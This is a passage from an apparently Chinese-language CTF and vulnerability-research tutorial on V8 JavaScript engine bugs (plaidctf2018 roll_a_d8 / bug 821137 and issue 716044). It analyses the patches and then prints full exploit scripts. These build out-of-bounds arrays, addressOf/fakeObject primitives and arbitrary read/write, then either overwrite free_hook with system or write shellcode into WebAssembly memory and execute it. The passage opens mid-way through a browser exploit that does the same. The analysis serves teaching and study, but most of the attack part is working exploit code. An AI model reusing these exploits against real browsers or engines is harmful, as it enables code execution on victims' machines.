faker[5] = i2f64(0); //properties
faker[6] = i2f64(0); //elements
faker[7] = p64f(0xffffffff,0); //length
faker[8] = i2f64(wasm_shellcode_ptr_addr);
faker[9] = 0x2;

var arb_ArrayBuffer = fakeObject(element_addr+0x20n);
var adv = new DataView(arb_ArrayBuffer);
var wasm_shellcode_addr = adv.getBigUint64(0,true);
//alert('wasm_shellcode_addr=' + wasm_shellcode_addr.toString(16));
faker[8] = i2f64(wasm_shellcode_addr);
//替换wasm的shellcode
for (var i=0;i&lt;shellcode.length;i++) `{`
   adv.setUint32(i*4,shellcode[i],true);
`}`
//执行shellcode
func();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
```

### <a class="reference-link" name="0x03.01%20plaidctf2018-roll_a_d8"></a>0x03.01 plaidctf2018-roll_a_d8

#### <a class="reference-link" name="patch%E5%88%86%E6%9E%90"></a>patch分析

```
diff --git a/src/builtins/builtins-array-gen.cc b/src/builtins/builtins-array-gen.cc
index dcf3be4..3a74342 100644
--- a/src/builtins/builtins-array-gen.cc
+++ b/src/builtins/builtins-array-gen.cc
@@ -1945,10 +1945,13 @@
   void GenerateSetLength(TNode&lt;Context&gt; context, TNode&lt;Object&gt; array,
                          TNode&lt;Number&gt; length) `{`
     Label fast(this), runtime(this), done(this);
+    // TODO(delphick): We should be able to skip the fast set altogether, if the
+    // length already equals the expected length, which it always is now on the
+    // fast path.
     // Only set the length in this stub if
     // 1) the array has fast elements,
     // 2) the length is writable,
-    // 3) the new length is greater than or equal to the old length.
+    // 3) the new length is equal to the old length.

     // 1) Check that the array has fast elements.
     // TODO(delphick): Consider changing this since it does an an unnecessary
@@ -1970,10 +1973,10 @@
       // BranchIfFastJSArray above.
       EnsureArrayLengthWritable(LoadMap(fast_array), &amp;runtime);

-      // 3) If the created array already has a length greater than required,
+      // 3) If the created array's length does not match the required length,
       //    then use the runtime to set the property as that will insert holes
-      //    into the excess elements and/or shrink the backing store.
-      GotoIf(SmiLessThan(length_smi, old_length), &amp;runtime);
+      //    into excess elements or shrink the backing store as appropriate.
+      GotoIf(SmiNotEqual(length_smi, old_length), &amp;runtime);

       StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset,
                                      length_smi);
diff --git a/test/mjsunit/regress/regress-821137.js b/test/mjsunit/regress/regress-821137.js
new file mode 100644
index 0000000..639b3b9
--- /dev/null
+++ b/test/mjsunit/regress/regress-821137.js
@@ -0,0 +1,27 @@
+// Copyright 2018 the V8 project authors. All rights reserved.
+// Use of this source code is governed by a BSD-style license that can be
+// found in the LICENSE file.
+
+// Tests that creating an iterator that shrinks the array populated by
+// Array.from does not lead to out of bounds writes.
+let oobArray = [];
+let maxSize = 1028 * 8;
+Array.from.call(function() `{` return oobArray `}`, `{`[Symbol.iterator] : _ =&gt; (
+  `{`
+    counter : 0,
+    next() `{`
+      let result = this.counter++;
+      if (this.counter &gt; maxSize) `{`
+        oobArray.length = 0;
+        return `{`done: true`}`;
+      `}` else `{`
+        return `{`value: result, done: false`}`;
+      `}`
+    `}`
+  `}`
+) `}`);
+assertEquals(oobArray.length, maxSize);
+
+// iterator reset the length to 0 just before returning done, so this will crash
+// if the backing store was not resized correctly.
+oobArray[oobArray.length - 1] = 0x41414141;
```

这题并不是patch引入漏洞，而是patch修复了漏洞，这是一个真实存在于v8中的历史漏洞，并且从patch中可以知道其代号为`821137`，我们在github上搜索一下代号找到一个commit，点击parent，获得其存在漏洞的那个commit为`1dab065bb4025bdd663ba12e2e976c34c3fa6599`，于是使用`git checkout 1dab065bb4025bdd663ba12e2e976c34c3fa6599`，然后编译v8即可。<br>
从patch中可以看到，已经有POC了，我们来分析一下POC的原理。<br>
首先，漏洞出在`GenerateSetLength`函数，那么我们查找一下该函数的上层调用，发现其在

```
// ES #sec-array.from
TF_BUILTIN(ArrayFrom, ArrayPopulatorAssembler)
```

函数中被调用，处`bootstrapper.cc`中可以知道该函数是`Array.from`的具体实现

```
SimpleInstallFunction(array_function, "from", Builtins::kArrayFrom, 1,
                          false);
```

该函数的作用是通过一个迭代器为数组元素赋值，用法如下

```
let arr = [6,6,6,6];
Array.from.call(function() `{` return arr `}`, `{`[Symbol.iterator] : _ =&gt; (
  `{`
    counter : 0,
    next() `{`
      let result = this.counter++;
      if (this.counter &gt; 10) `{`
        return `{`done: true`}`;
      `}` else `{`
        return `{`value: result, done: false`}`;
      `}`
    `}`
  `}`
) `}`);
print(arr);
```

输出如下

```
root@ubuntu:~/Desktop/plaidctf2018-roll_a_d8/x64.debug# ./d8 poc.js
0,1,2,3,4,5,6,7,8,9
```

其中`[Symbol.iterator]`是固定语法，表明这是一个迭代器，我们只需要重写迭代器里的`next`函数即可实现自己的逻辑。<br>
我们先看到`TF_BUILTIN(ArrayFrom, ArrayPopulatorAssembler)`函数中迭代的逻辑

```
BIND(&amp;loop);
    `{`
      // Loop while iterator is not done.
      TNode&lt;Object&gt; next = CAST(iterator_assembler.IteratorStep(
          context, iterator_record, &amp;loop_done, fast_iterator_result_map));
      TVARIABLE(Object, value,
                CAST(iterator_assembler.IteratorValue(
                    context, next, fast_iterator_result_map)));

      // If a map_function is supplied then call it (using this_arg as
      // receiver), on the value returned from the iterator. Exceptions are
      // caught so the iterator can be closed.
      `{`
        Label next(this);
        GotoIf(IsUndefined(map_function), &amp;next);

        CSA_ASSERT(this, IsCallable(map_function));
        Node* v = CallJS(CodeFactory::Call(isolate()), context, map_function,
                         this_arg, value.value(), index.value());
        GotoIfException(v, &amp;on_exception, &amp;var_exception);
        value = CAST(v);
        Goto(&amp;next);
        BIND(&amp;next);
      `}`

      // Store the result in the output object (catching any exceptions so the
      // iterator can be closed).
      Node* define_status =
          CallRuntime(Runtime::kCreateDataProperty, context, array.value(),
                      index.value(), value.value());
      GotoIfException(define_status, &amp;on_exception, &amp;var_exception);

      index = NumberInc(index.value());

      // The spec requires that we throw an exception if index reaches 2^53-1,
      // but an empty loop would take &gt;100 days to do this many iterations. To
      // actually run for that long would require an iterator that never set
      // done to true and a target array which somehow never ran out of memory,
      // e.g. a proxy that discarded the values. Ignoring this case just means
      // we would repeatedly call CreateDataProperty with index = 2^53.
      CSA_ASSERT_BRANCH(this, [&amp;](Label* ok, Label* not_ok) `{`
        BranchIfNumberRelationalComparison(Operation::kLessThan, index.value(),
                                           NumberConstant(kMaxSafeInteger), ok,
                                           not_ok);
      `}`);
      Goto(&amp;loop);
    `}`

    BIND(&amp;loop_done);
    `{`
      length = index;
      Goto(&amp;finished);
    `}`
```

可以看到当迭代完成也就是`loop_done`的时候，将迭代次数`index`赋值给了`length`变量，然后最后，调用`GenerateSetLength`函数将这个length设置到array对象里

```
// Finally set the length on the output and return it.
  GenerateSetLength(context, array.value(), length.value());
```

而`GenerateSetLength`函数将迭代次数与原来的数组长度进行对比，如果比原来的小，就调用js层的`SetProperty`函数将arr的length设置，否则直接将length值写入。这里看似没有什么问题，但是问题就发生在回调的逻辑里，这里是假设了array对象的length和迭代次数`同步的递增`，我们可以在迭代回调函数里趁机把array对象的length给改小，然后进入`GenerateSetLength(context, array.value(), length.value())`函数时就可以绕过`GotoIf(SmiLessThan(length_smi, old_length), &amp;runtime);`函数，直接将迭代次数设置为array对象的length。调用`SetProperty`和使用`StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset, length_smi);`来设置length的不同之处在于`SetProperty`是js层的，调用它来设置会顺便将elements扩容或收缩，而`StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset, length_smi);`函数不回调，直接在内存里写上这个值。因此，不扩容，就造成了溢出。

#### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用

POC

```
let arr = [1.1];
Array.from.call(function() `{` return arr `}`, `{`[Symbol.iterator] : _ =&gt; (
  `{`
    counter : 0,
    next() `{`
      let result = this.counter++;
      if (this.counter &gt; 10) `{`
        arr.length = 1;
        return `{`done: true`}`;
      `}` else `{`
        return `{`value: result, done: false`}`;
      `}`
    `}`
  `}`
) `}`);
%DebugPrint(arr);
%SystemBreak();
```

可以看到length为10，然而elements的长度值却为1

[![](https://p4.ssl.qhimg.com/t01cb0a26697f527b6e.png)](https://p4.ssl.qhimg.com/t01cb0a26697f527b6e.png)

由此，我们利用溢出，改写ArrayBuffer的length和backing_store即可实现任意地址读写<br>
exp

```
var buf = new ArrayBuffer(0x8);
var dv = new DataView(buf);

function p64f(value1,value2) `{`
   dv.setUint32(0,value1,true);
   dv.setUint32(0x4,value2,true);
   return dv.getFloat64(0,true);
`}`

function i2f64(value) `{`
   dv.setBigUint64(0,BigInt(value),true);
   return dv.getFloat64(0,true);
`}`

function u64_l(value) `{`
   dv.setFloat64(0,value,true);
   return dv.getUint32(0,true);
`}`

function u64_h(value) `{`
   dv.setFloat64(0,value,true);
   return dv.getUint32(4,true);
`}`


let obj = `{``}`;

var spray_size = 0x1000;
var arr = new Array(spray_size);

let oobArray = [];
//转为double array
oobArray[0] = 1.1;
oobArray.length = 0;
let maxSize = 1024*8;

Array.from.call(function() `{` return oobArray `}`, `{`[Symbol.iterator] : _ =&gt; (
  `{`
    counter : 0,
    next() `{`
      let result = this.counter++;
      if (this.counter &gt; maxSize) `{`
        oobArray.length = 0x1;
        //堆喷
        for (var i=0;i&lt;spray_size;i++) `{`
           arr[i] = new ArrayBuffer(0x1234);
        `}`
        return `{`done: true`}`;
      `}` else `{`
        return `{`value: result, done: false`}`;
      `}`
    `}`
  `}`
) `}`);

var backing_store_h = u64_h(oobArray[5]);
var backing_stroe_l = u64_l(oobArray[5]);
print(backing_store_h.toString(16) + backing_stroe_l.toString(16));
//修改ArrayBuffer的byteLength
oobArray[4] = p64f(0,0x666666);

var oob_buf;
//寻找被成功修改的那个ArrayBuffer
for (var i=0;i&lt;spray_size;i++) `{`
   if (arr[i].byteLength != 0x1234) `{`
      oob_buf = arr[i];
      print("found!!" + arr[i].byteLength);
   `}`
`}`

if (oob_buf == null) `{`
   console.log("error!");
`}`

var oob_dv  = new DataView(oob_buf);

function read64(addr_h,addr_l) `{`
   oobArray[5] = p64f(addr_l,addr_h);
   return oob_dv.getFloat64(0,true);
`}`

function write64(addr_h,addr_l,value) `{`
   oobArray[5] = p64f(addr_l,addr_h);
   oob_dv.setFloat64(0,value,true);
`}`


var d = read64(backing_store_h,backing_stroe_l + 0x1820);
var elf_base_h = u64_h(d);
var elf_base_l = u64_l(d) - 0xb83338;

d = read64(elf_base_h,elf_base_l + 0xB9A118);
var libc_base_h = u64_h(d);
var libc_base_l = u64_l(d) - 0x21ab0;
var system_l = libc_base_l + 0x4f4e0;
var free_hook_l = libc_base_l + 0x3ed8e8;
console.log("[+]libc_base=" + libc_base_h.toString(16) + libc_base_l.toString(16));
console.log("[+]system=" + libc_base_h.toString(16) + system_l.toString(16));
console.log("[+]free_hook=" + libc_base_h.toString(16) + free_hook_l.toString(16));
//需要执行的命令
var shell_buf = new ArrayBuffer(0x30);
var str = "/bin/sh\x00";
var bufView = new Uint8Array(shell_buf);
for (var i=0, strLen=str.length; i&lt;strLen; i++) `{`
   bufView[i] = str.charCodeAt(i);
`}`
//写free_hook
write64(libc_base_h,free_hook_l,p64f(system_l,libc_base_h));
```

### <a class="reference-link" name="0x03.02%20issue%20716044"></a>0x03.02 issue 716044

#### <a class="reference-link" name="patch%E5%88%86%E6%9E%90"></a>patch分析

```
diff --git a/src/builtins/builtins-array-gen.cc b/src/builtins/builtins-array-gen.cc
index 32dd9b5..316c0b7 100644
--- a/src/builtins/builtins-array-gen.cc
+++ b/src/builtins/builtins-array-gen.cc
@@ -15,13 +15,11 @@
       : CodeStubAssembler(state),
         k_(this, MachineRepresentation::kTagged),
         a_(this, MachineRepresentation::kTagged),
-        to_(this, MachineRepresentation::kTagged, SmiConstant(0)) `{``}`
-
-  typedef std::function&lt;Node*(ArrayBuiltinCodeStubAssembler* masm)&gt;
-      BuiltinResultGenerator;
+        to_(this, MachineRepresentation::kTagged, SmiConstant(0)),
+        fully_spec_compliant_(this, `{`&amp;k_, &amp;a_, &amp;to_`}`) `{``}`

   typedef std::function&lt;void(ArrayBuiltinCodeStubAssembler* masm)&gt;
-      BuiltinResultIndexInitializer;
+      BuiltinResultGenerator;

   typedef std::function&lt;Node*(ArrayBuiltinCodeStubAssembler* masm,
                               Node* k_value, Node* k)&gt;
@@ -30,7 +28,7 @@
   typedef std::function&lt;void(ArrayBuiltinCodeStubAssembler* masm)&gt;
       PostLoopAction;

-  Node* ForEachResultGenerator() `{` return UndefinedConstant(); `}`
+  void ForEachResultGenerator() `{` a_.Bind(UndefinedConstant()); `}`

   Node* ForEachProcessor(Node* k_value, Node* k) `{`
     CallJS(CodeFactory::Call(isolate()), context(), callbackfn(), this_arg(),
@@ -38,7 +36,7 @@
     return a();
   `}`

-  Node* SomeResultGenerator() `{` return FalseConstant(); `}`
+  void SomeResultGenerator() `{` a_.Bind(FalseConstant()); `}`

   Node* SomeProcessor(Node* k_value, Node* k) `{`
     Node* value = CallJS(CodeFactory::Call(isolate()), context(), callbackfn(),
@@ -51,7 +49,7 @@
     return a();
   `}`

-  Node* EveryResultGenerator() `{` return TrueConstant(); `}`
+  void EveryResultGenerator() `{` a_.Bind(TrueConstant()); `}`

   Node* EveryProcessor(Node* k_value, Node* k) `{`
     Node* value = CallJS(CodeFactory::Call(isolate()), context(), callbackfn(),
@@ -64,7 +62,7 @@
     return a();
   `}`

-  Node* ReduceResultGenerator() `{` return this_arg(); `}`
+  void ReduceResultGenerator() `{` return a_.Bind(this_arg()); `}`

   Node* ReduceProcessor(Node* k_value, Node* k) `{`
     VARIABLE(result, MachineRepresentation::kTagged);
@@ -91,9 +89,9 @@
     BIND(&amp;ok);
   `}`

-  Node* FilterResultGenerator() `{`
+  void FilterResultGenerator() `{`
     // 7. Let A be ArraySpeciesCreate(O, 0).
-    return ArraySpeciesCreate(context(), o(), SmiConstant(0));
+    a_.Bind(ArraySpeciesCreate(context(), o(), SmiConstant(0)));
   `}`

   Node* FilterProcessor(Node* k_value, Node* k) `{`
@@ -162,13 +160,53 @@
     return a();
   `}`

-  Node* MapResultGenerator() `{`
-    // 5. Let A be ? ArraySpeciesCreate(O, len).
-    return ArraySpeciesCreate(context(), o(), len_);
+  void MapResultGenerator() `{`
+    Label runtime(this), done(this, `{`&amp;a_`}`);
+    GotoIf(DoesntHaveInstanceType(o(), JS_ARRAY_TYPE), &amp;runtime);
+    Node* o_map = LoadMap(o());
+    Node* const initial_array_prototype = LoadContextElement(
+        LoadNativeContext(context()), Context::INITIAL_ARRAY_PROTOTYPE_INDEX);
+    Node* proto = LoadMapPrototype(o_map);
+    GotoIf(WordNotEqual(proto, initial_array_prototype), &amp;runtime);
+
+    Node* species_protector = SpeciesProtectorConstant();
+    Node* value = LoadObjectField(species_protector, Cell::kValueOffset);
+    Node* const protector_invalid = SmiConstant(Isolate::kProtectorInvalid);
+    GotoIf(WordEqual(value, protector_invalid), &amp;runtime);
+
+    Node* const initial_array_constructor = LoadContextElement(
+        LoadNativeContext(context()), Context::ARRAY_FUNCTION_INDEX);
+    a_.Bind(ConstructJS(CodeFactory::Construct(isolate()), context(),
+                        initial_array_constructor, len_));
+    Goto(&amp;done);
+
+    BIND(&amp;runtime);
+    `{`
+      // 5. Let A be ? ArraySpeciesCreate(O, len).
+      Node* constructor =
+          CallRuntime(Runtime::kArraySpeciesConstructor, context(), o());
+      a_.Bind(ConstructJS(CodeFactory::Construct(isolate()), context(),
+                          constructor, len_));
+      Goto(&amp;fully_spec_compliant_);
+    `}`
+    BIND(&amp;done);
   `}`

-  Node* MapProcessor(Node* k_value, Node* k) `{`
-    //  i. Let kValue be ? Get(O, Pk). Performed by the caller of MapProcessor.
+  Node* SpecCompliantMapProcessor(Node* k_value, Node* k) `{`
+    //  i. Let kValue be ? Get(O, Pk). Performed by the caller of
+    //  SpecCompliantMapProcessor.
+    // ii. Let mappedValue be ? Call(callbackfn, T, kValue, k, O).
+    Node* mappedValue = CallJS(CodeFactory::Call(isolate()), context(),
+                               callbackfn(), this_arg(), k_value, k, o());
+
+    // iii. Perform ? CreateDataPropertyOrThrow(A, Pk, mappedValue).
+    CallRuntime(Runtime::kCreateDataProperty, context(), a(), k, mappedValue);
+    return a();
+  `}`
+
+  Node* FastMapProcessor(Node* k_value, Node* k) `{`
+    //  i. Let kValue be ? Get(O, Pk). Performed by the caller of
+    //  FastMapProcessor.
     // ii. Let mappedValue be ? Call(callbackfn, T, kValue, k, O).
     Node* mappedValue = CallJS(CodeFactory::Call(isolate()), context(),
                                callbackfn(), this_arg(), k_value, k, o());
@@ -268,8 +306,7 @@
       const CallResultProcessor&amp; processor, const PostLoopAction&amp; action,
       const Callable&amp; slow_case_continuation,
       ForEachDirection direction = ForEachDirection::kForward) `{`
-    Label non_array(this), slow(this, `{`&amp;k_, &amp;a_, &amp;to_`}`),
-        array_changes(this, `{`&amp;k_, &amp;a_, &amp;to_`}`);
+    Label non_array(this), array_changes(this, `{`&amp;k_, &amp;a_, &amp;to_`}`);

     // TODO(danno): Seriously? Do we really need to throw the exact error
     // message on null and undefined so that the webkit tests pass?
@@ -336,11 +373,11 @@
       k_.Bind(NumberDec(len()));
     `}`

-    a_.Bind(generator(this));
+    generator(this);

-    HandleFastElements(processor, action, &amp;slow, direction);
+    HandleFastElements(processor, action, &amp;fully_spec_compliant_, direction);

-    BIND(&amp;slow);
+    BIND(&amp;fully_spec_compliant_);

     Node* result =
         CallStub(slow_case_continuation, context(), receiver(), callbackfn(),
@@ -440,7 +477,7 @@
     `}` else `{`
       k_.Bind(NumberDec(len()));
     `}`
-    a_.Bind(generator(this));
+    generator(this);
     Node* elements_type = LoadInstanceType(LoadElements(o_));
     Switch(elements_type, &amp;unexpected_instance_type, instance_types.data(),
            label_ptrs.data(), labels.size());
@@ -690,6 +727,7 @@
   Variable k_;
   Variable a_;
   Variable to_;
+  Label fully_spec_compliant_;
 `}`;

 TF_BUILTIN(FastArrayPush, CodeStubAssembler) `{`
@@ -1168,7 +1206,7 @@
                                             len, to);

   GenerateIteratingArrayBuiltinLoopContinuation(
-      &amp;ArrayBuiltinCodeStubAssembler::MapProcessor,
+      &amp;ArrayBuiltinCodeStubAssembler::SpecCompliantMapProcessor,
       &amp;ArrayBuiltinCodeStubAssembler::NullPostLoopAction);
 `}`

@@ -1187,7 +1225,7 @@

   GenerateIteratingArrayBuiltinBody(
       "Array.prototype.map", &amp;ArrayBuiltinCodeStubAssembler::MapResultGenerator,
-      &amp;ArrayBuiltinCodeStubAssembler::MapProcessor,
+      &amp;ArrayBuiltinCodeStubAssembler::FastMapProcessor,
       &amp;ArrayBuiltinCodeStubAssembler::NullPostLoopAction,
       Builtins::CallableFor(isolate(), Builtins::kArrayMapLoopContinuation));
 `}`
diff --git a/src/code-stub-assembler.h b/src/code-stub-assembler.h
index dbdd5f0..ba35e25 100644
--- a/src/code-stub-assembler.h
+++ b/src/code-stub-assembler.h
@@ -51,7 +51,8 @@
   V(Tuple2Map, Tuple2Map)                             \
   V(Tuple3Map, Tuple3Map)                             \
   V(UndefinedValue, Undefined)                        \
-  V(WeakCellMap, WeakCellMap)
+  V(WeakCellMap, WeakCellMap)                         \
+  V(SpeciesProtector, SpeciesProtector)

 // Provides JavaScript-specific "macro-assembler" functionality on top of the
 // CodeAssembler. By factoring the JavaScript-isms out of the CodeAssembler,
diff --git a/test/mjsunit/mjsunit.status b/test/mjsunit/mjsunit.status
index 60fc9e6..25bc972 100644
--- a/test/mjsunit/mjsunit.status
+++ b/test/mjsunit/mjsunit.status
@@ -65,6 +65,7 @@
   # Too slow in debug mode for validation of elements.
   'regress/regress-430201': [PASS, ['mode == debug', SKIP]],
   'regress/regress-430201b': [PASS, ['mode == debug', SKIP]],
+  'regress/regress-716044': [PASS, ['mode == debug', SKIP]],

   ##############################################################################
   # Too slow in debug mode for GC stress mode.
diff --git a/test/mjsunit/regress/regress-716044.js b/test/mjsunit/regress/regress-716044.js
new file mode 100644
index 0000000..264424c
--- /dev/null
+++ b/test/mjsunit/regress/regress-716044.js
@@ -0,0 +1,25 @@
+// Copyright 2017 the V8 project authors. All rights reserved.
+// Use of this source code is governed by a BSD-style license that can be
+// found in the LICENSE file.
+
+// Flags: --verify-heap
+
+class Array1 extends Array `{`
+  constructor(len) `{`
+      super(1);
+    `}`
+`}`;
+
+class MyArray extends Array `{`
+  static get [Symbol.species]() `{`
+      return Array1;
+    `}`
+`}`
+
+a = new MyArray();
+
+for (var i = 0; i &lt; 100000; i++) `{`
+  a.push(1);
+`}`
+
+a.map(function(x) `{` return 42; `}`);
```

这题与前一题类似，也是一个真实的v8历史漏洞，代号为`716044`。从patch中，我们看到其中`MapResultGenerator`函数的变化较大，我们查找其的上层调用，发现其在`TF_BUILTIN(ArrayMap, ArrayBuiltinCodeStubAssembler)`函数中被调用

```
GenerateIteratingArrayBuiltinBody(
      "Array.prototype.map", &amp;ArrayBuiltinCodeStubAssembler::MapResultGenerator,
      &amp;ArrayBuiltinCodeStubAssembler::MapProcessor,
      &amp;ArrayBuiltinCodeStubAssembler::NullPostLoopAction,
      Builtins::CallableFor(isolate(), Builtins::kArrayMapLoopContinuation));
```

可以知道这是`Array.prototype.map`函数的具体实现，该函数的作用是将键值进行映射

```
var a = [1,2,3,4];
print(a.map(function(x) `{` return x+1;  `}`));
```

其输出为

```
root@ubuntu:~/Desktop/issue_716044/x64.release# ./d8 t.js
2,3,4,5
```

即该函数接收一个函数对象，作为映射的变换函数，映射的值来源于调用数组对象。继续分析GenerateIteratingArrayBuiltinBody函数

```
void GenerateIteratingArrayBuiltinBody(
      const char* name, const BuiltinResultGenerator&amp; generator,
      const CallResultProcessor&amp; processor, const PostLoopAction&amp; action,
      const Callable&amp; slow_case_continuation,
      ForEachDirection direction = ForEachDirection::kForward) `{`
    Label non_array(this), slow(this, `{`&amp;k_, &amp;a_, &amp;to_`}`),
        array_changes(this, `{`&amp;k_, &amp;a_, &amp;to_`}`);

    // TODO(danno): Seriously? Do we really need to throw the exact error
    // message on null and undefined so that the webkit tests pass?
    Label throw_null_undefined_exception(this, Label::kDeferred);
    GotoIf(WordEqual(receiver(), NullConstant()),
           &amp;throw_null_undefined_exception);
    GotoIf(WordEqual(receiver(), UndefinedConstant()),
           &amp;throw_null_undefined_exception);

    // By the book: taken directly from the ECMAScript 2015 specification

    // 1. Let O be ToObject(this value).
    // 2. ReturnIfAbrupt(O)
    //o_是原数组对象
    o_ = CallStub(CodeFactory::ToObject(isolate()), context(), receiver());

    // 3. Let len be ToLength(Get(O, "length")).
    // 4. ReturnIfAbrupt(len).
    VARIABLE(merged_length, MachineRepresentation::kTagged);
    Label has_length(this, &amp;merged_length), not_js_array(this);
    GotoIf(DoesntHaveInstanceType(o(), JS_ARRAY_TYPE), &amp;not_js_array);
    merged_length.Bind(LoadJSArrayLength(o()));
    Goto(&amp;has_length);
    BIND(&amp;not_js_array);
    Node* len_property =
        GetProperty(context(), o(), isolate()-&gt;factory()-&gt;length_string());
    merged_length.Bind(
        CallStub(CodeFactory::ToLength(isolate()), context(), len_property));
    Goto(&amp;has_length);
    BIND(&amp;has_length);
    //len值为原数组的长度
    len_ = merged_length.value();

    // 5. If IsCallable(callbackfn) is false, throw a TypeError exception.
    Label type_exception(this, Label::kDeferred);
    Label done(this);
    GotoIf(TaggedIsSmi(callbackfn()), &amp;type_exception);
    Branch(IsCallableMap(LoadMap(callbackfn())), &amp;done, &amp;type_exception);

    BIND(&amp;throw_null_undefined_exception);
    `{`
      CallRuntime(
          Runtime::kThrowTypeError, context(),
          SmiConstant(MessageTemplate::kCalledOnNullOrUndefined),
          HeapConstant(isolate()-&gt;factory()-&gt;NewStringFromAsciiChecked(name)));
      Unreachable();
    `}`

    BIND(&amp;type_exception);
    `{`
      CallRuntime(Runtime::kThrowTypeError, context(),
                  SmiConstant(MessageTemplate::kCalledNonCallable),
                  callbackfn());
      Unreachable();
    `}`

    BIND(&amp;done);

    // 6. If thisArg was supplied, let T be thisArg; else let T be undefined.
    // [Already done by the arguments adapter]

    if (direction == ForEachDirection::kForward) `{`
      // 7. Let k be 0.
      k_.Bind(SmiConstant(0));
    `}` else `{`
      k_.Bind(NumberDec(len()));
    `}`
    //调用MapResultGenerator函数创建用于保存结果的数组
    a_.Bind(generator(this));

    HandleFastElements(processor, action, &amp;slow, direction);

    BIND(&amp;slow);
   //调用映射函数生成映射，并将结果保存到a_中
    Node* result =
        CallStub(slow_case_continuation, context(), receiver(), callbackfn(),
                 this_arg(), a_.value(), o(), k_.value(), len(), to_.value());
    ReturnFromBuiltin(result);
  `}`
```

而`MapResultGenerator`函数调用了`ArraySpeciesCreate`，继续跟踪

```
Node* MapResultGenerator() `{`
    // 5. Let A be ? ArraySpeciesCreate(O, len).
    return ArraySpeciesCreate(context(), o(), len_);
  `}`
```

而`ArraySpeciesCreate`函数如下

```
Node* CodeStubAssembler::ArraySpeciesCreate(Node* context, Node* originalArray,
                                            Node* len) `{`
  // TODO(mvstanton): Install a fast path as well, which avoids the runtime
  // call.
  Node* constructor =
      CallRuntime(Runtime::kArraySpeciesConstructor, context, originalArray);
  return ConstructJS(CodeFactory::Construct(isolate()), context, constructor,
                     len);
`}`
```

回调了js层的SpeciesConstructor函数，目的是为了调用合适的构造函数，比如如下

```
class MyArray extends Array `{`
  static get [Symbol.species]() `{`
      return Array;
  `}`
`}`

a = new MyArray(1.1,2.2);
var b = a.map(function(x) `{`return x+1`}`);
%DebugPrint(b);
```

其中

```
static get [Symbol.species]()
```

是固定写法，该函数返回一个类型，那么下一步回调结束，程序就会从Array类里调用构造函数，从而创建了一个Array的对象，假如代码改为如下

```
class Array1 extends Array `{`
  constructor(len) `{`
      print("len=" + len);
      super(len);
    `}`
`}`;

class MyArray extends Array `{`
  static get [Symbol.species]() `{`
      return Array1;
  `}`
`}`

a = new MyArray(1.1,2.2);
var b = a.map(function(x) `{`return x+1`}`);
%DebugPrint(b);
```

由于`static get [Symbol.species]()`返回了Array1，因此map时会从Array1里调用构造函数，此时，我们可以控制`super()`函数里的参数，如下

```
lass Array1 extends Array `{`
  constructor(len) `{`
      super(1);
    `}`
`}`;

class MyArray extends Array `{`
  static get [Symbol.species]() `{`
      return Array1;
  `}`
`}`

a = new MyArray(1.1,2.2);
var b = a.map(function(x) `{`return x+1`}`);
%DebugPrint(b);
```

但是最后映射结果的时候，仍然使用的之前的len，因此在进行函数映射时，由于没有检查用于存放结果的数组的长度，便发生了`越界写`。

```
Node* result =
        CallStub(slow_case_continuation, context(), receiver(), callbackfn(),
                 this_arg(), a_.value(), o(), k_.value(), len(), to_.value());

  Node* len() `{` return len_; `}`
```

#### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用

既然能越界写，那么我们就越界覆盖后方Array对象的length，进而构造一个oob的arr，然后利用手法就和前面一样了。<br>
exp

```
var buf = new ArrayBuffer(0x8);
var dv = new DataView(buf);

function p64f(value1,value2) `{`
   dv.setUint32(0,value1,true);
   dv.setUint32(0x4,value2,true);
   return dv.getFloat64(0,true);
`}`

function u64_l(value) `{`
   dv.setFloat64(0,value,true);
   return dv.getUint32(0,true);
`}`

function u64_h(value) `{`
   dv.setFloat64(0,value,true);
   return dv.getUint32(4,true);
`}`


var obj = `{``}`;
var oob_double_arr;
var obj_arr;
var arb_buf;

class Array1 extends Array `{`
  constructor(len) `{`
      super(1); //将数组长度缩减为1
      oob_double_arr = [1.1,2.2];
      obj_arr = [obj];
      arb_buf = new ArrayBuffer(0x10);
    `}`
`}`;

class MyArray extends Array `{`
  static get [Symbol.species]() `{`
      return Array1;
    `}`
`}`

a = new MyArray();

//第8个位置将会写入数据
a[8] = 0x1;
//OOB
var b = a.map(function(x) `{` return 1000; `}`);

var array_buffer_map = oob_double_arr[0xe];

function addressOf(obj) `{`
   obj_arr[0] = obj;
   var addr = oob_double_arr[0xd];
   return addr;
`}`

function fakeObject(addr_h,addr_l) `{`
   oob_double_arr[0xd] = p64f(addr_l,addr_h);
   var mobj = obj_arr[0];
   return mobj;
`}`

const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);
const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var func = wasmInstance.exports.main;

var d = addressOf(func);
var wasm_shellcode_ptr_addr_h = u64_h(d);
var wasm_shellcode_ptr_addr_l = u64_l(d) - 0x1 + 0x38;

oob_double_arr[0x11] = p64f(0,0xffff);
oob_double_arr[0x12] = p64f(wasm_shellcode_ptr_addr_l,wasm_shellcode_ptr_addr_h);

var adv = new DataView(arb_buf);
